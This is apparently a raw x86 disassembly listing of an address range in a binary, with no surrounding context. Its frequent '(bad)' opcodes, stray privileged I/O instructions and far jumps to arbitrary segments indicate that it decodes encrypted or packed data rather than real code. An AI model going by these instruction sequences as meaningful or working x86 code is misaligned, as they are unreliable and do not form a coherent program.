  420bcc:	std    
  420bcd:	ja     0x420bc2
  420bcf:	jl     0x420b91
  420bd1:	add    DWORD PTR fs:[esi],ecx
  420bd4:	mov    DWORD PTR [edi],0x7330e56c
  420bda:	lds    ecx,FWORD PTR ds:0xbaab7745
  420be0:	mov    bh,0xd6
  420be2:	nop
  420be3:	mov    esp,?
  420be5:	cmp    bl,ch
  420be7:	repz cs (bad) 
  420bea:	loope  0x420ba0
  420bec:	clc    
  420bed:	fmul   st(3),st
  420bef:	retf   
  420bf0:	je     0x420bd1
  420bf2:	mov    eax,ds:0x1799f6b0
  420bf7:	adc    DWORD PTR [ecx-0x49],ebp
  420bfa:	lahf   
  420bfb:	inc    edi
  420bfc:	jne    0x420be5
  420bfe:	jno    0xd7a5e1b5
  420c04:	ret    
  420c05:	retf   
  420c06:	popw   ds
  420c08:	jne    0x420c10
  420c0a:	push   eax
  420c0b:	and    DWORD PTR [ecx],edx
  420c0d:	xor    eax,esp
  420c0f:	loop   0x420c49
  420c11:	push   eax
  420c12:	inc    eax
  420c13:	std    
  420c14:	(bad)  
  420c15:	fld    TBYTE PTR [eax+0xcd258f2]
  420c1b:	mov    ah,0xe5
  420c1d:	js     0x420c5e
  420c1f:	out    dx,eax
  420c20:	xchg   esi,eax
  420c21:	jbe    0x420c3c
  420c23:	pop    ebx
  420c24:	mov    ch,0x3b
  420c26:	call   0xdc4:0x741c1c30
  420c2d:	and    BYTE PTR [edx],bh
  420c2f:	scas   eax,DWORD PTR es:[edi]
  420c30:	sahf   
  420c31:	and    eax,0xa294591d
  420c36:	xchg   edx,eax
  420c37:	popf   
  420c38:	or     DWORD PTR [ecx+0x6b],ebx
  420c3b:	(bad)  
  420c3c:	int3   
  420c3d:	test   al,0x41
  420c3f:	mov    cl,0x19
  420c41:	push   ecx
  420c42:	sbb    DWORD PTR [edi],edx
  420c44:	jmp    0x708c:0xb0a7b1db
  420c4b:	lock sbb al,0xbf
  420c4e:	bound  ecx,QWORD PTR [edx-0x755006e7]
  420c54:	rol    DWORD PTR [ebp-0x255d5491],0xac
  420c5b:	stos   BYTE PTR es:[edi],al
  420c5c:	fadd   st(2),st
  420c5e:	sub    BYTE PTR [edx],ah
  420c60:	pusha  
  420c61:	pop    esp
  420c62:	call   0xc8281881
  420c67:	sbb    eax,ebx
  420c69:	fwait
  420c6a:	xor    eax,0xbce9a326
  420c6f:	adc    BYTE PTR [eax],bl
  420c71:	stos   BYTE PTR es:[edi],al
  420c72:	inc    bx
  420c74:	or     al,BYTE PTR [ebp+eax*8-0x62]
  420c78:	add    DWORD PTR [ebx],0xffffffaa
  420c7b:	push   es
  420c7c:	ffree  st(2)
  420c7e:	push   0xf6a87adf
  420c83:	test   eax,0x2506130a
  420c88:	rcl    BYTE PTR [ebx],1
  420c8a:	xor    al,ch
  420c8c:	xor    DWORD PTR [esi+0x108db543],esi
  420c92:	mov    esp,0xb9a82f50
  420c97:	mov    dh,0x21
  420c99:	cmp    al,0x4b
  420c9b:	pop    ds
  420c9c:	push   cs
  420c9d:	push   0x3e2058e5
  420ca2:	cs iret 
  420ca4:	div    DWORD PTR [ebx]
  420ca6:	ret    
  420ca7:	sub    BYTE PTR ds:0x89fdc8f,ah
  420cad:	jmp    0x420c3c
  420caf:	sbb    bh,al
  420cb1:	imul   edx,DWORD PTR [ecx],0x7ac044bf
  420cb7:	in     al,0x23
  420cb9:	neg    al
  420cbb:	loop   0x420cca
  420cbd:	test   eax,0xf7c6449a
  420cc2:	dec    edx
  420cc3:	fist   WORD PTR [esp+esi*4-0x61]
  420cc7:	loop   0x420c53
  420cc9:	in     eax,dx
  420cca:	jecxz  0x420d1c
  420ccc:	pop    edx
  420ccd:	test   DWORD PTR [eax-0x30],0x8d370a69
  420cd4:	sbb    dl,dh
  420cd6:	vaddsubpd xmm0,xmm0,xmm6
  420cda:	ror    BYTE PTR [edi+eiz*4+0x4f0539d4],cl
  420ce1:	pop    esp
  420ce2:	inc    esi
  420ce3:	xor    al,0xa9
  420ce5:	cmc    
  420ce6:	es sti 
  420ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ce9:	fnstenv fs:[ebx+0x45991c8b]
  420cf0:	dec    ecx
  420cf1:	push   ecx
  420cf2:	fcom   DWORD PTR [esi]
  420cf4:	mov    edx,0x6a2d3ad8
  420cf9:	test   eax,0xd99381ee
  420cfe:	outs   dx,DWORD PTR ds:[esi]
  420cff:	sbb    bl,ch
  420d01:	pushf  
  420d02:	jmp    0x1f8a:0xbe8714ca
  420d09:	cmp    bh,cl
  420d0b:	pushf  
  420d0c:	mov    esi,0xafed89c1
  420d11:	add    eax,0x573adeec
  420d16:	add    ebx,DWORD PTR [ecx-0x2f]
  420d19:	ins    DWORD PTR es:[edi],dx
  420d1a:	push   ss
  420d1b:	xchg   edi,eax
  420d1c:	ins    DWORD PTR es:[edi],dx
  420d1d:	pop    edi
  420d1e:	das    
  420d1f:	and    bh,BYTE PTR [esi+ecx*4]
  420d22:	ja     0x420d04
  420d24:	xor    ebx,DWORD PTR [edi+0x34]
  420d27:	sbb    cl,BYTE PTR [eax-0x65]
  420d2a:	push   edx
  420d2b:	and    edi,DWORD PTR [esi+0x24aa326b]
  420d31:	mov    eax,ds:0x577213b9
  420d36:	push   0xffffff8a
  420d38:	or     BYTE PTR [ebp-0x5a3d463],ah
  420d3e:	into   
  420d3f:	icebp  
  420d40:	xchg   ebp,eax
  420d41:	sar    DWORD PTR [ecx-0x684227e2],cl
  420d47:	add    DWORD PTR [ebp+0x250ee8b4],esi
  420d4d:	pop    es
  420d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d4f:	push   0x92e7c7dc
  420d54:	mov    al,0xf6
  420d56:	ret    0x7839
  420d59:	(bad)  
  420d5a:	js     0x420dda
  420d5c:	maxps  xmm0,xmm2
  420d5f:	imul   esi,DWORD PTR [ebx*8+0x6745ce77],0x5d89d349
  420d6a:	jae    0x420dc5
  420d6c:	xchg   edi,eax
  420d6d:	inc    edx
  420d6e:	xor    eax,0x7ed908cd
  420d73:	dec    ecx
  420d74:	jo     0x420d67
  420d76:	shl    BYTE PTR [ebx+edi*1-0x425b10cd],0x9e
  420d7e:	sti    
  420d7f:	pop    edi
  420d80:	sbb    eax,0x22fef3e8
  420d85:	and    BYTE PTR [ebp-0x73],dh
  420d88:	cwde   
  420d89:	mov    bl,0x81
  420d8b:	into   
  420d8c:	retf   
  420d8d:	mov    dl,BYTE PTR [edi]
  420d8f:	shl    DWORD PTR [edx+0x437468e5],0xfb
  420d96:	gs imul ebx,esi,0x34
  420d9a:	out    dx,eax
  420d9b:	mov    edx,DWORD PTR [ebp-0x721bceb0]
  420da1:	xor    eax,0x1c458c41
  420da6:	(bad)  
  420da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420da8:	test   BYTE PTR [ebx-0x1e],bl
  420dab:	in     eax,0x7b
  420dad:	mov    gs,eax
  420daf:	into   
  420db0:	daa    
  420db1:	les    ebp,FWORD PTR [edx+0x14]
  420db4:	inc    ebp
  420db5:	fwait
  420db6:	mov    al,0x6a
  420db8:	test   eax,0xa3523af
  420dbd:	xchg   ebx,eax
  420dbe:	push   ss
  420dbf:	mov    ?,WORD PTR [eax-0x6a]
  420dc2:	shr    DWORD PTR [eax],0x39
  420dc5:	inc    ecx
  420dc6:	mov    ds:0xae57030c,eax
  420dcb:	sbb    DWORD PTR [esi+0x4c],edi
  420dce:	aam    0xc
  420dd0:	sub    al,0x4c
  420dd2:	and    bl,dh
  420dd4:	adc    eax,0x49ccf80c
  420dd9:	into   
  420dda:	sub    esp,DWORD PTR [edx]
  420ddc:	retf   0x9649
  420ddf:	std    
  420de0:	xchg   DWORD PTR fs:[ecx+eax*1],esi
  420de4:	dec    esp
  420de5:	xchg   edi,eax
  420de6:	xor    dh,bh
  420de8:	inc    ebp
  420de9:	outs   dx,BYTE PTR ds:[esi]
  420dea:	out    dx,eax
  420deb:	jb     0x420def
  420ded:	xor    eax,0x770ce981
  420df2:	jno    0x420d84
  420df4:	xor    esi,DWORD PTR [edi-0x3b]
  420df7:	ret    
  420df8:	mov    ecx,0x70270a2
  420dfd:	mov    DWORD PTR [ebx-0x4abc7415],edi
  420e03:	cmc    
  420e04:	cwde   
  420e05:	fisubr DWORD PTR [ebx+0x2b]
  420e08:	push   0xc79a0d7a
  420e0d:	pop    es
  420e0e:	mov    ebp,0xd9aae5a5
  420e13:	(bad)  
  420e14:	rcr    edx,1
  420e16:	loope  0x420dac
  420e18:	xchg   edx,eax
  420e19:	push   0x31
  420e1b:	shl    DWORD PTR [esi],1
  420e1d:	cmp    eax,0x89d94cc2
  420e22:	test   al,0x92
  420e24:	cmp    eax,DWORD PTR fs:[ebp-0x3f7f2a3f]
  420e2b:	popf   
  420e2c:	shl    DWORD PTR [edi+0x5c962a75],1
  420e32:	mov    DWORD PTR [eax-0x25],esp
  420e35:	sbb    ah,dh
  420e37:	imul   ebp,edi,0xffffffa7
  420e3a:	sbb    eax,0x4b599802
  420e3f:	test   ch,dl
  420e41:	ins    DWORD PTR es:[edi],dx
  420e42:	loope  0x420dca
  420e44:	adc    eax,0x725d9d3f
  420e49:	jle    0x420e71
  420e4b:	lds    edx,FWORD PTR [ebp+0x6c51a65e]
  420e51:	dec    ecx
  420e52:	pop    esp
  420e53:	mov    ds:0x982843e7,eax
  420e58:	jle    0x420e60
  420e5a:	mov    al,0x60
  420e5c:	ss div BYTE PTR ds:[edx+ebp*1]
  420e61:	push   ebx
  420e62:	fistp  QWORD PTR [ebp-0x39084016]
  420e68:	mov    edx,0xdd00089c
  420e6d:	or     DWORD PTR [edx],edi
  420e6f:	stos   BYTE PTR es:[edi],al
  420e70:	rol    esp,cl
  420e72:	popf   
  420e73:	fmul   DWORD PTR [edx+eax*1+0x17d6432a]
  420e7a:	mov    WORD PTR ds:0x89c54605,cs
  420e80:	dec    esp
  420e81:	cmp    al,0xa9
  420e83:	imul   ecx,DWORD PTR [edx+0x17],0xdcd1f876
  420e8a:	inc    esp
  420e8b:	xrelease xchg DWORD PTR [eax-0x65],ebp
  420e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e90:	(bad)  
  420e91:	pop    eax
  420e92:	ss adc ah,cl
  420e95:	add    ah,BYTE PTR [edi]
  420e97:	or     ecx,ebp
  420e99:	inc    eax
  420e9a:	mov    WORD PTR [ebp+0x65f5babe],gs
  420ea0:	jl     0x420ecc
  420ea2:	mov    al,0x8a
  420ea4:	in     al,0x5c
  420ea6:	mov    bh,0x44
  420ea8:	sbb    BYTE PTR [eax],dh
  420eaa:	and    ah,bl
  420eac:	jns    0x420e7c
  420eae:	(bad)  
  420eaf:	push   DWORD PTR [ebx]
  420eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eb2:	xor    DWORD PTR [ecx],0x940bb3d7
  420eb8:	mov    ds:0xd2b58f98,eax
  420ebd:	sbb    eax,0x38a0b52e
  420ec2:	scas   eax,DWORD PTR es:[edi]
  420ec3:	cmp    DWORD PTR [ecx-0x22218839],ecx
  420ec9:	mov    eax,0xc7d6ced9
  420ece:	(bad)  
  420ecf:	pop    ss
  420ed0:	or     eax,0x59d5ba7c
  420ed5:	xchg   edx,eax
  420ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ed7:	nop
  420ed8:	repz xor esp,eax
  420edb:	fdivr  QWORD PTR [esi-0x27]
  420ede:	sbb    ebp,esi
  420ee0:	test   dh,ah
  420ee2:	mov    cl,0x20
  420ee4:	jg     0x420f4f
  420ee6:	(bad)  
  420ee7:	out    dx,al
  420ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ee9:	pusha  
  420eea:	(bad)  
  420eeb:	repz xlat BYTE PTR ds:[ebx]
  420eed:	shl    DWORD PTR [ebp-0x168b7e0d],cl
  420ef3:	adc    eax,0x33561c04
  420ef8:	in     eax,dx
  420ef9:	dec    edi
  420efa:	mov    dh,0x8d
  420efc:	aaa    
  420efd:	sbb    DWORD PTR [esi+0x70],ebp
  420f00:	jle    0x420e86
  420f02:	dec    eax
  420f03:	sar    DWORD PTR [ecx-0x5f],0x4
  420f07:	(bad)  
  420f08:	dec    esi
  420f09:	(bad)
  420f0c:	xchg   esp,eax
  420f0d:	push   0xeca35f8
  420f12:	mov    bh,0x7e
  420f14:	std    
  420f15:	mov    fs,WORD PTR [edx+esi*1]
  420f18:	inc    esp
  420f19:	push   es
  420f1a:	into   
  420f1b:	popf   
  420f1c:	sub    eax,0x863b7c90
  420f21:	es push eax
  420f23:	mov    esi,0x61ca21f2
  420f28:	and    dl,0x66
  420f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f2c:	xchg   edi,eax
  420f2d:	xchg   esp,eax
  420f2e:	cli    
  420f2f:	sbb    al,0xcf
  420f31:	mov    es,WORD PTR ds:0x34bc9767
  420f37:	cdq    
  420f38:	xchg   edx,eax
  420f39:	xlat   BYTE PTR ds:[ebx]
  420f3a:	imul   edi,ebp,0x3cbfa814
  420f40:	sub    al,0x35
  420f42:	mov    ebp,0xf46eeac4
  420f47:	mov    eax,0xdcb60dde
  420f4c:	jae    0x420f2f
  420f4e:	push   edx
  420f4f:	ja     0x420f3d
  420f51:	xor    eax,0x90369ad3
  420f56:	or     bh,BYTE PTR [ebx-0x2ccc868]
  420f5c:	pop    ss
  420f5d:	das    
  420f5e:	mov    ah,0xb3
  420f60:	xlat   BYTE PTR ds:[ebx]
  420f61:	pop    esi
  420f62:	mov    es,WORD PTR [ecx+0x5e]
  420f65:	sti    
  420f66:	mov    edx,0xf5f61060
  420f6b:	stc    
  420f6c:	shl    al,0xd8
  420f6f:	mov    bh,BYTE PTR [edx]
  420f71:	push   edx
  420f72:	pop    ebx
  420f73:	cld    
  420f74:	ror    BYTE PTR [ecx+0x14],1
  420f77:	push   cs
  420f78:	out    dx,al
  420f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f7a:	inc    eax
  420f7b:	nop
  420f7c:	pop    esp
  420f7d:	(bad)  
  420f7e:	imul   ecx,DWORD PTR [ebx],0xbf92f088
  420f84:	sub    DWORD PTR [ebx+0x10139b8],esi
  420f8a:	push   esp
  420f8b:	stc    
  420f8c:	or     al,0xe3
  420f8e:	cmp    eax,0xce1c2d9a
  420f93:	inc    ebx
  420f94:	icebp  
  420f95:	mov    es,WORD PTR [edi+0x59]
  420f98:	bound  edi,QWORD PTR [edi+edx*8+0x26]
  420f9c:	inc    DWORD PTR [eax-0x4d]
  420f9f:	add    esi,eax
  420fa1:	sbb    esi,esp
  420fa3:	out    dx,al
  420fa4:	push   ecx
  420fa5:	adc    DWORD PTR [ecx+0x19],ecx
  420fa8:	(bad)  
  420fa9:	cmp    DWORD PTR [ebp-0x639c11fe],ebp
  420faf:	lds    edx,FWORD PTR [esi+esi*8+0xb306a2b]
  420fb6:	add    DWORD PTR [ebp+0x13],0xab4aa581
  420fbd:	inc    esi
  420fbe:	fistp  WORD PTR ds:0x447b7b0e
  420fc4:	mov    cl,0x5d
  420fc6:	push   eax
  420fc7:	pop    ecx
  420fc8:	out    0x64,eax
  420fca:	mov    ebp,0xda50e0e4
  420fcf:	sbb    dh,cl
  420fd1:	mov    DWORD PTR [edx],eax
  420fd3:	rcl    BYTE PTR [ecx+0x55],1
  420fd6:	dec    edx
  420fd7:	iret   
  420fd8:	mov    ebp,ecx
  420fda:	pop    ebp
  420fdb:	cld    
  420fdc:	out    dx,al
  420fdd:	popa   
  420fde:	outs   dx,DWORD PTR ds:[esi]
  420fdf:	jnp    0x420fe3
  420fe1:	test   eax,0x62305c35
  420fe6:	fs sub eax,0x79048d91
  420fec:	add    ebp,DWORD PTR [eax+0x24]
  420fef:	fcomip st,st(6)
  420ff1:	fnsave ds:0x38fbf4af
  420ff7:	outs   dx,DWORD PTR ds:[esi]
  420ff8:	push   ebx
  420ff9:	lods   eax,DWORD PTR ds:[esi]
  420ffa:	mov    ds:0xd74edd72,al
  420fff:	rcl    ecx,cl
  421001:	add    al,al
  421003:	outs   dx,BYTE PTR ds:[esi]
  421004:	ror    ch,cl
  421006:	lea    edi,ds:0x334dc5e2
  42100c:	dec    ebp
  42100d:	jae    0x420fa1
  42100f:	aaa    
  421010:	mov    dl,0x69
  421012:	cmp    cl,BYTE PTR [eax+0x1dc810cd]
  421018:	das    
  421019:	mov    edx,0x66375217
  42101e:	ins    BYTE PTR es:[edi],dx
  42101f:	out    dx,al
  421020:	jnp    0x421003
  421022:	je     0x421054
  421024:	hlt    
  421025:	test   DWORD PTR [eax-0x7891f338],ecx
  42102b:	mov    esi,0x37ea0f18
  421030:	or     edi,DWORD PTR [ebx+0x73b9e77f]
  421036:	jmp    0x3b29:0xacb94c56
  42103d:	loop   0x420fde
  42103f:	arpl   WORD PTR cs:[ebx+0x1b],di
  421043:	mov    eax,0x453741e2
  421048:	into   
  421049:	(bad)  
  42104a:	add    ecx,DWORD PTR [edx-0x764057b7]
  421050:	sub    al,0x3
  421052:	jecxz  0x4210b5
  421054:	pop    esp
  421055:	lahf   
  421056:	call   0xbdf2a677
  42105b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42105c:	cwde   
  42105d:	mul    bl
  42105f:	data16 loopne 0x421055
  421062:	inc    ecx
  421063:	int    0xa9
  421065:	inc    edx
  421066:	jns    0x421011
  421068:	push   eax
  421069:	jl     0x4210a6
  42106b:	sub    ch,bl
  42106d:	and    al,0x8c
  42106f:	xchg   esi,eax
  421070:	xchg   ecx,eax
  421071:	enter  0x32f5,0x16
  421075:	iret   
  421076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421077:	jne    0x4210e3
  421079:	jmp    0x42100d
  42107b:	or     dl,BYTE PTR gs:[esi+ebp*1+0x9]
  421080:	dec    ebx
  421081:	mov    al,0x46
  421083:	in     eax,dx
  421084:	lock adc ch,al
  421087:	ret    0x7c78
  42108a:	jmp    0x454b:0x59a0a18f
  421091:	xor    al,0xc5
  421093:	call   0x9ae:0x79453bd7
  42109a:	jb     0x4210c1
  42109c:	push   ebp
  42109d:	push   ds
  42109e:	mov    ah,dh
  4210a0:	xor    al,0x2e
  4210a3:	sbb    eax,0xc248e391
  4210a8:	ret    0xb937
  4210ab:	xor    eax,0xcd48ed77
  4210b0:	cmp    edx,DWORD PTR [ebx+eiz*8+0x44fd0807]
  4210b7:	std    
  4210b8:	xchg   ebp,eax
  4210b9:	sbb    BYTE PTR [ebp-0x4a],ch
  4210bc:	inc    BYTE PTR ss:[eax]
  4210bf:	imul   ecx,DWORD PTR [esi+esi*4+0x34],0xf0d91049
  4210c7:	inc    edi
  4210c8:	and    DWORD PTR [esi-0x68e4dd23],edi
  4210ce:	les    edx,FWORD PTR [edi-0x14]
  4210d1:	(bad)  
  4210d2:	fcom   DWORD PTR [esi+ebx*1]
  4210d5:	jl     0x4210f5
  4210d7:	stos   BYTE PTR es:[edi],al
  4210d8:	cmp    eax,0x350de5a4
  4210dd:	daa    
  4210de:	xlat   BYTE PTR ds:[ebx]
  4210df:	push   ss
  4210e0:	mov    ds:0x12c83da8,eax
  4210e5:	stos   DWORD PTR es:[edi],eax
  4210e6:	inc    ebx
  4210e7:	repnz sahf 
  4210e9:	ret    0xfb89
  4210ec:	jecxz  0x421070
  4210ee:	int3   
  4210ef:	cmp    DWORD PTR [esi],0xdd0eb4fd
  4210f5:	sub    BYTE PTR [edx-0x7ef6e0e9],0xe1
  4210fc:	ds mov dh,0x5c
  4210ff:	out    dx,eax
  421100:	mov    WORD PTR [ebx-0x7b],?
  421103:	xor    eax,0xc74427fc
  421108:	pop    ebx
  421109:	adc    eax,ecx
  42110b:	push   0x7354604c
  421110:	fld    TBYTE PTR [ebx]
  421112:	(bad)  
  421113:	sbb    ecx,ebp
  421115:	jl     0x4210e0
  421117:	pop    eax
  421118:	push   eax
  421119:	scas   al,BYTE PTR es:[edi]
  42111a:	sub    BYTE PTR [edi+0x7ce0d177],ah
  421120:	and    edi,DWORD PTR [edi]
  421122:	data16 fidivr DWORD PTR [edi+0x6a]
  421126:	pop    ebx
  421127:	fucom  st(3)
  421129:	xchg   ebx,eax
  42112a:	mov    cl,0x5
  42112c:	xor    eax,0xe1195d1f
  421131:	pushf  
  421132:	xor    DWORD PTR [edx-0x27],edx
  421135:	jle    0x421127
  421137:	arpl   sp,bp
  421139:	push   ebp
  42113a:	mov    dl,0xcc
  42113c:	arpl   si,di
  42113e:	and    al,BYTE PTR [ebp+0x24950fcd]
  421144:	add    BYTE PTR [ecx],cl
  421146:	and    al,0xd
  421148:	ror    BYTE PTR [eax-0x1],cl
  42114b:	dec    esp
  42114c:	call   0xed293592
  421151:	cmp    DWORD PTR [esi-0x7f3d3515],0x68c51b77
  42115b:	shl    DWORD PTR [eax],0xd7
  42115e:	jnp    0x421186
  421160:	das    
  421161:	hlt    
  421162:	pop    edx
  421163:	xlat   BYTE PTR ds:[ebx]
  421164:	gs pop ds
  421166:	ins    BYTE PTR es:[edi],dx
  421167:	or     bl,BYTE PTR [ebx]
  421169:	and    al,0x5b
  42116b:	hlt    
  42116c:	xor    edx,eax
  42116e:	or     eax,0xb6c33398
  421173:	sbb    eax,0xbeafb203
  421178:	in     al,dx
  421179:	ss rol ebp,cl
  42117c:	and    ebx,0xcc8e9c20
  421182:	idiv   DWORD PTR [ecx]
  421184:	cs push edx
  421186:	mov    al,ds:0x6f720982
  42118b:	ret    
  42118c:	jbe    0x421113
  42118e:	mov    bh,0x73
  421190:	fadd   DWORD PTR [eax+0x1339bff2]
  421196:	inc    edi
  421197:	or     ah,bl
  421199:	aas    
  42119a:	mov    dl,0x5d
  42119c:	daa    
  42119d:	enter  0xeace,0xd9
  4211a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211a2:	es repnz inc edi
  4211a5:	adc    al,0x5f
  4211a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211a9:	div    DWORD PTR [esi+0x6e]
  4211ac:	xor    DWORD PTR [edi+0x5c],ecx
  4211af:	clc    
  4211b0:	mov    esp,0x2ad56240
  4211b5:	cmp    dl,cl
  4211b7:	inc    esp
  4211b8:	jns    0x524445a1
  4211be:	xlat   BYTE PTR ss:[ebx]
  4211c0:	loop   0x421195
  4211c2:	mov    ecx,DWORD PTR [ebx-0xca9e8b8]
  4211c8:	mov    eax,ds:0x86c93b9d
  4211cd:	or     eax,esi
  4211cf:	dec    edx
  4211d0:	shl    ebx,0x2f
  4211d3:	xor    eax,DWORD PTR [ebx-0x68]
  4211d6:	jmp    FWORD PTR [edx-0x24ebd16f]
  4211dc:	test   ebx,esp
  4211de:	or     dl,BYTE PTR [ebx+eiz*2+0x14]
  4211e2:	fist   DWORD PTR [ebp+0xf]
  4211e5:	cmc    
  4211e6:	add    BYTE PTR [edi],0xe
  4211e9:	mov    ?,WORD PTR [ebx+ecx*2+0x32b64914]
  4211f0:	nop
  4211f1:	pop    es
  4211f2:	sub    BYTE PTR [ecx-0x44],bl
  4211f5:	or     cl,BYTE PTR [eax+0x19]
  4211f8:	sub    ch,ah
  4211fa:	add    eax,0x17d6e71
  4211ff:	mov    dl,0x2f
  421201:	mov    esp,0x6e29c841
  421206:	popa   
  421207:	jecxz  0x4211c2
  421209:	cld    
  42120a:	or     BYTE PTR [edx-0x26],0x27
  42120e:	mov    DWORD PTR [edi],edx
  421210:	icebp  
  421211:	push   edi
  421212:	(bad)  
  421213:	fsub   DWORD PTR [edx+0x37d28b83]
  421219:	(bad)  
  42121a:	mov    dl,0x77
  42121c:	cld    
  42121d:	(bad)  
  42121e:	push   0xf3dc9e1f
  421223:	add    eax,0x45716593
  421228:	fisttp WORD PTR [ecx+0x4b]
  42122b:	std    
  42122c:	and    ecx,esp
  42122e:	rcr    BYTE PTR [edx],cl
  421230:	pop    ebp
  421231:	fstp   QWORD PTR [eax]
  421233:	fnstcw WORD PTR [ebp+0x2c]
  421236:	cdq    
  421237:	stos   BYTE PTR es:[edi],al
  421238:	push   esp
  421239:	inc    BYTE PTR [esi+0x6f]
  42123c:	(bad)
  421240:	mov    ebx,0x4c0e81e1
  421245:	nop
  421246:	xor    esp,DWORD PTR [edi]
  421248:	(bad)  
  421249:	call   FWORD PTR [edx+ebx*8+0xcffd5bd]
  421250:	int    0x2c
  421252:	mov    BYTE PTR [eax],0x9e
  421255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421256:	call   0x4506c715
  42125b:	daa    
  42125c:	into   
  42125d:	(bad)  
  42125e:	loopne 0x42129c
  421260:	inc    edx
  421261:	test   BYTE PTR [edx],ch
  421263:	fld    st(7)
  421265:	out    dx,al
  421266:	imul   DWORD PTR [edi+0x3e63d48e]
  42126c:	jae    0x421227
  42126e:	cs dec edx
  421270:	sub    esp,DWORD PTR [edi+0x40]
  421273:	popf   
  421274:	mov    bh,0x10
  421276:	(bad)  
  421278:	and    BYTE PTR [edi+0x94e7c9],0x7c
  42127f:	jecxz  0x4212f8
  421281:	add    al,0xb3
  421283:	pop    ss
  421284:	sbb    ch,BYTE PTR [edi+ecx*1-0x14b36865]
  42128b:	mov    WORD PTR [ebp+0x2b],?
  42128e:	in     al,0x2d
  421290:	xchg   ecx,eax
  421291:	fwait
  421292:	or     al,0x99
  421294:	gs push edi
  421296:	jmp    0x9506:0xe95089e
  42129d:	jmp    0xb77d:0x351db2c4
  4212a4:	bound  ecx,QWORD PTR [eax-0x62ccfeb9]
  4212aa:	mov    eax,0x3677442d
  4212af:	cmp    BYTE PTR [ecx+ebp*8],ah
  4212b2:	scas   eax,DWORD PTR es:[edi]
  4212b3:	adc    esi,DWORD PTR [edx+eax*2+0x668c7f02]
  4212ba:	lds    edi,FWORD PTR [eax+0x7]
  4212bd:	xchg   DWORD PTR [ecx-0x5a0d5485],ebx
  4212c3:	mov    BYTE PTR [ebp-0x4b38b391],cl
  4212c9:	mov    ds:0x2976cb0a,al
  4212ce:	sbb    eax,0x7f52b59b
  4212d3:	push   ebx
  4212d4:	dec    edi
  4212d5:	xchg   DWORD PTR [ebx*2+0x59bdb3be],esp
  4212dc:	test   DWORD PTR [ecx+0x27a49483],edx
  4212e2:	or     BYTE PTR [ebp+0x48],ch
  4212e5:	(bad)  
  4212e6:	xchg   edi,eax
  4212e7:	inc    edi
  4212e8:	xchg   esp,eax
  4212e9:	aam    0x9
  4212eb:	(bad)  
  4212ec:	in     al,0x9e
  4212ee:	in     eax,0x67
  4212f0:	test   DWORD PTR [esi-0x5d],ebp
  4212f3:	sti    
  4212f4:	fistp  QWORD PTR [esi]
  4212f6:	inc    ecx
  4212f7:	and    eax,0x9357c707
  4212fc:	aaa    
  4212fd:	popf   
  4212fe:	stos   BYTE PTR es:[edi],al
  4212ff:	mov    bh,BYTE PTR [edx-0x282ca589]
  421305:	push   esp
  421306:	pop    ebp
  421307:	(bad)  
  421308:	jmp    0x9e1d:0x10899ac2
  42130f:	xor    al,0x75
  421311:	add    ch,BYTE PTR [ebp+0x10]
  421314:	xchg   ebx,eax
  421315:	jmp    0xa210496
  42131a:	leave  
  42131b:	jmp    0x4fb4:0xef4c825c
  421322:	les    edx,FWORD PTR [ecx+0x28]
  421325:	mov    ds:0xad530aea,eax
  42132a:	pop    ebx
  42132b:	pusha  
  42132c:	mov    al,BYTE PTR [ecx]
  42132e:	es pminub mm5,mm2
  421332:	cmp    dl,dh
  421334:	pusha  
  421335:	out    dx,al
  421336:	xchg   esp,eax
  421337:	out    dx,eax
  421338:	(bad)  
  42133a:	jp     0x421399
  42133c:	pop    es
  42133d:	(bad)
  421340:	push   0x53
  421342:	in     al,0x21
  421344:	fdivr  DWORD PTR [esi-0x20]
  421347:	enter  0x2994,0xbe
  42134b:	fidivr DWORD PTR [ecx-0x5f]
  42134e:	mov    ebx,ebp
  421350:	pop    edi
  421351:	out    dx,eax
  421352:	mov    bh,0x61
  421354:	mov    ecx,0xf3b764d6
  421359:	std    
  42135a:	stos   DWORD PTR es:[edi],eax
  42135b:	jo     0x4213d9
  42135d:	xchg   esp,eax
  42135e:	pusha  
  42135f:	bound  edx,QWORD PTR ds:0x9d0a428a
  421365:	mov    DWORD PTR ds:0x8df36628,edi
  42136b:	jmp    0x421307
  42136d:	sub    ebx,esi
  42136f:	fsubp  st(7),st
  421371:	data16 xor al,ah
  421374:	jp     0x4212fa
  421376:	in     eax,dx
  421377:	test   esp,0xe1a2325b
  42137d:	aad    0xc9
  42137f:	popf   
  421380:	and    BYTE PTR gs:[ecx-0x1b],0x5b
  421385:	mov    eax,ds:0xd694e48b
  42138a:	pop    ss
  42138b:	mov    edi,DWORD PTR [edi+esi*2]
  42138e:	pop    es
  42138f:	inc    ebp
  421390:	cmp    DWORD PTR ds:[edi-0x57],0xbffa2677
  421398:	fldcw  WORD PTR [edx+esi*8-0x61ac2109]
  42139f:	mov    gs,WORD PTR [eax+0x41]
  4213a2:	xchg   ebx,eax
  4213a3:	popa   
  4213a4:	jnp    0x421361
  4213a6:	int    0x81
  4213a8:	in     eax,0xd0
  4213aa:	add    eax,0xfa24fdb1
  4213af:	cld    
  4213b0:	shr    DWORD PTR [ecx-0x60],0xd0
  4213b4:	inc    esi
  4213b5:	mov    es,WORD PTR [eax+0x2a361d4e]
  4213bb:	aaa    
  4213bc:	call   0x9dae:0xb7920d0
  4213c3:	mov    BYTE PTR [ebx+0x7a],ch
  4213c6:	pop    es
  4213c7:	mov    edx,0xa2c7ff30
  4213cc:	mov    esi,0xd55e14bb
  4213d1:	test   BYTE PTR [esi+0x7e],bl
  4213d4:	mov    ds:0x176fcdd2,al
  4213d9:	adc    BYTE PTR [edi],0x94
